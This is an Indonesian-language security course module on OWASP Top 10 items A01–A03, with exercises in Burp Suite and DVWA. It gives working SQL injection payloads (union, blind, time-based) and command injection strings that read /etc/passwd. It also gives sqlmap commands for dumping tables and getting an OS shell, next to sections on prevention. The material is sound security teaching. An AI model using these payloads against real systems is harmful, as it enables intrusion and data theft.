# 🌐 P10 — WEB APPLICATION HACKING: OWASP TOP 10 (BAGIAN 1)

> *"The web is the largest attack surface in the world."*

---

## 1. APA ITU OWASP?

**OWASP** (Open Web Application Security Project) adalah organisasi nonprofit yang memproduksi dokumentasi, tools, dan standar keamanan aplikasi web.

**OWASP Top 10** adalah daftar 10 risiko keamanan web paling kritis, diperbarui secara berkala.

### OWASP Top 10 (2021)

| # | Kategori | Deskripsi Singkat |
|---|----------|------------------|
| A01 | **Broken Access Control** | Pengguna bisa akses resource yang tidak seharusnya |
| A02 | **Cryptographic Failures** | Enkripsi lemah, data sensitif terekspos |
| A03 | **Injection** | SQL, Command, LDAP injection |
| A04 | **Insecure Design** | Desain arsitektur yang cacat |
| A05 | **Security Misconfiguration** | Konfigurasi default, error verbose |
| A06 | **Vulnerable Components** | Library/framework dengan CVE |
| A07 | **Auth & Identity Failures** | Login, session, password lemah |
| A08 | **Data Integrity Failures** | Deserialization, update tanpa verifikasi |
| A09 | **Logging & Monitoring Failures** | Tidak ada log/monitoring |
| A10 | **SSRF** | Server-Side Request Forgery |

**P10 membahas A01–A03 (Bagian 1). P11 membahas sisanya (Bagian 2).**

---

## 2. A01: BROKEN ACCESS CONTROL

Pengguna bisa mengakses resource, data, atau fungsi yang **tidak seharusnya** mereka akses.

### 2.1 IDOR (Insecure Direct Object Reference)

```
# User A login, melihat profilnya:
GET /api/users/1001    → { "name": "User A", "email": "a@mail.com" }

# User A mengubah ID:
GET /api/users/1002    → { "name": "User B", "email": "b@mail.com" }  ← IDOR!
# Server tidak memverifikasi apakah User A berhak melihat data User B
```

**Cara Eksploitasi di Burp Suite**:
1. Login sebagai user biasa
2. Intercept request di Burp Proxy
3. Kirim ke Repeater
4. Ubah ID (1001 → 1002, 1003, ...)
5. Jika data user lain muncul → IDOR confirmed!

### 2.2 Forced Browsing

```
# Halaman admin tanpa access control:
https://target.com/admin/dashboard    ← Bisa diakses tanpa login!
https://target.com/backup/db.sql      ← File backup terekspos!
https://target.com/.git/config        ← Git config terekspos!
```

### 2.3 Privilege Escalation (Horizontal & Vertical)

```
Horizontal: User A → akses data User B (level sama)
Vertical:   User biasa → akses fungsi admin (level berbeda)

Contoh Vertical:
POST /api/change-role
{"user_id": 1001, "role": "admin"}    ← User biasa bisa set role admin!
```

### Pencegahan

- Deny by default — tolak semua, lalu whitelist
- Validasi authorization di server-side, BUKAN client-side
- Gunakan role-based access control (RBAC)
- Jangan gunakan ID yang predictable (gunakan UUID)

---

## 3. A02: CRYPTOGRAPHIC FAILURES

Data sensitif tidak dilindungi dengan baik — enkripsi lemah atau tidak ada.

### Contoh Kerentanan

```
# Password disimpan plaintext di database
SELECT * FROM users;
| id | username | password      |
|----|----------|---------------|
| 1  | admin    | admin123      |  ← FATAL!
| 2  | user1    | password      |  ← FATAL!

# Seharusnya:
| id | username | password_hash                              |
|----|----------|---------------------------------------------|
| 1  | admin    | $2b$12$LJ3m5K...  (bcrypt hash + salt)     |

# Data sensitif dikirim via HTTP (bukan HTTPS)
http://bank.com/transfer?amount=10000&to=attacker  ← Bisa disadap!

# Cookie tanpa flag Secure
Set-Cookie: session=abc123   ← Bisa dicuri via HTTP
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict  ← Benar!
```

### Pencegahan

- Selalu gunakan HTTPS (TLS 1.2+)
- Hash password dengan bcrypt/Argon2 (BUKAN MD5/SHA)
- Enkripsi data sensitif at rest (AES-256)
- Jangan hardcode API keys/secrets di source code
- Set cookie flags: Secure, HttpOnly, SameSite

---

## 4. A03: INJECTION — SQL INJECTION (Raja Serangan Web)

### 4.1 Bagaimana SQL Injection Bekerja

```php
// Kode PHP VULNERABLE:
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// User memasukkan:
// Username: admin' --
// Password: (apapun)

// Query menjadi:
SELECT * FROM users WHERE username='admin' --' AND password='apapun'
//                                         ↑
//                    Komentar SQL! Sisa query diabaikan!
//                    → Login sebagai admin TANPA password!
```

### 4.2 Tipe-Tipe SQL Injection

#### Error-Based SQLi
Memanfaatkan error message untuk extract data.

```
# Input:
' OR 1=1 --

# Server error reveals:
# "You have an error in your SQL syntax near '1=1 --' at line 1"
# → Konfirmasi SQL injection possible!
```

#### Union-Based SQLi
Menggunakan UNION untuk menggabungkan query dan extract data.

```sql
# Step 1: Tentukan jumlah kolom
' ORDER BY 1 --    ← OK
' ORDER BY 2 --    ← OK
' ORDER BY 3 --    ← OK
' ORDER BY 4 --    ← ERROR! → 3 kolom

# Step 2: Cari kolom yang visible
' UNION SELECT 1,2,3 --
# → Lihat angka mana yang muncul di halaman (misal: 2 dan 3)

# Step 3: Extract data
' UNION SELECT 1,username,password FROM users --
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
```

#### Blind SQLi (Boolean-Based)
Server tidak menampilkan error, tapi responsnya berbeda (true/false).

```sql
# True condition → halaman normal
' AND 1=1 --

# False condition → halaman berbeda/kosong
' AND 1=2 --

# Extract data karakter per karakter:
' AND SUBSTRING(username,1,1)='a' --    ← Karakter pertama username = 'a'?
' AND SUBSTRING(username,1,1)='b' --    ← Karakter pertama = 'b'?
```

#### Time-Based Blind SQLi
Menggunakan delay untuk menentukan true/false.

```sql
# Jika true, server delay 5 detik:
' AND IF(1=1, SLEEP(5), 0) --    ← Delay 5 detik → TRUE!
' AND IF(1=2, SLEEP(5), 0) --    ← No delay → FALSE

# Extract data:
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
```

### 4.3 SQLMap — Automated SQL Injection

```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dengan cookie (authenticated)
sqlmap -u "http://target.com/page.php?id=1" \
    --cookie="PHPSESSID=abc123" --dbs

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# POST request
sqlmap -u "http://target.com/login" \
    --data="username=admin&password=test" --dbs

# Dari Burp request file
sqlmap -r request.txt --dbs

# OS shell (jika DBA privileges)
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### 4.4 Command Injection

```bash
# Kode vulnerable:
# system("ping " . $_GET['ip']);

# Normal: ?ip=192.168.1.1
# Attack: ?ip=192.168.1.1; cat /etc/passwd
# Attack: ?ip=192.168.1.1 && whoami
# Attack: ?ip=192.168.1.1 | id
# Attack: ?ip=$(whoami)
# Attack: ?ip=`id`

# Command separators:
;     # Unix
&&    # Unix/Windows (execute if previous succeeds)
||    # Unix/Windows (execute if previous fails)
|     # Unix pipe
`cmd` # Unix backtick substitution
$(cmd) # Unix command substitution
```

### 4.5 Pencegahan Injection

```php
// VULNERABLE:
$query = "SELECT * FROM users WHERE id = '$id'";

// AMAN — Prepared Statements (Parameterized Queries):
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// AMAN — ORM (Object-Relational Mapping):
User::where('id', $id)->first();  // Laravel Eloquent
```

---

## 5. BURP SUITE — Web Security Testing Tool #1

### 5.1 Komponen Utama

| Komponen | Fungsi |
|----------|--------|
| **Proxy** | Intercept HTTP/HTTPS traffic browser ↔ server |
| **Repeater** | Kirim ulang & modifikasi request manual |
| **Intruder** | Automated attack (brute force, fuzzing) |
| **Scanner** | Automated vulnerability scanning (Pro only) |
| **Decoder** | Encode/decode data (Base64, URL, HTML) |
| **Comparer** | Bandingkan 2 response |

### 5.2 Workflow Dasar

```
1. Set browser proxy → 127.0.0.1:8080
2. Import Burp CA certificate di browser
3. Browse target website (Burp captures semua traffic)
4. Intercept ON → modifikasi request → Forward
5. Kirim request menarik ke Repeater untuk testing manual
6. Gunakan Intruder untuk automated testing
```

### 5.3 Contoh: Testing SQL Injection dengan Burp

```
1. Intercept login request:
   POST /login HTTP/1.1
   username=admin&password=test

2. Kirim ke Repeater (Ctrl+R)

3. Modifikasi parameter:
   username=admin' OR 1=1 --&password=test

4. Kirim → Cek response
   - 200 OK + "Welcome admin" → SQLi berhasil!
   - 401 Unauthorized → Coba payload lain

5. Kirim ke Intruder untuk test banyak payload:
   - Set position: username=§payload§&password=test
   - Load wordlist SQLi payloads
   - Start attack → analisis response length/status
```

---

## 6. HANDS-ON: DVWA (Damn Vulnerable Web Application)

```bash
# Setup DVWA di Docker
docker run --rm -d -p 80:80 vulnerables/web-dvwa

# Akses: http://localhost
# Login: admin / password
# Set security level: Low → Medium → High (progressively harder)

# Latihan:
# 1. SQL Injection → Extract semua user & password
# 2. Command Injection → Execute OS commands
# 3. File Inclusion → Read /etc/passwd
# 4. Brute Force → Crack admin password
```

---

## 7. CHECKLIST PEMAHAMAN P10

- [ ] Jelaskan OWASP Top 10 dan 5 kategori pertama
- [ ] Apa itu IDOR dan bagaimana mengeksploitasinya?
- [ ] Tulis 3 payload SQL injection (error, union, blind)
- [ ] Gunakan SQLMap untuk enumerate database
- [ ] Apa itu Command Injection? Sebutkan 3 command separator
- [ ] Jelaskan perbedaan prepared statements vs string concatenation
- [ ] Setup dan gunakan Burp Suite Proxy
- [ ] Gunakan Burp Repeater untuk test SQL injection
- [ ] Eksploitasi DVWA: SQL Injection semua level
- [ ] Apa itu Cryptographic Failures? Berikan 3 contoh

---

*Selanjutnya: [P11 — Web Hacking: OWASP Top 10 Bagian 2](./P11-OWASP-Part2.md)*
